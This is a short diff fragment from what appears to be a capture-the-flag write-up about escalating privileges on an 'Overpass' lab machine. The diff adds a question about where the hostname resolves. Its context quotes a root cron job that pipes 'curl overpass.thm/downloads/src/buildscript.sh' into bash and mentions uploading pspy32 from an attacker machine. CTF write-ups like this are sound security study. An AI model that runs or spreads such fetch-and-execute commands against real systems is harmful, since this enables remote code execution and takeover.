@@ -197,6 +197,7 @@ I uploaded pspy32 using a python web server on my attacker pc. This found a reap
 ```
 /bin/sh -c curl overpass.thm/downloads/src/buildscript.sh | bash
 ```
+where does overpass.thm resolve to?
 
 ```bash
 ping overpass.thm
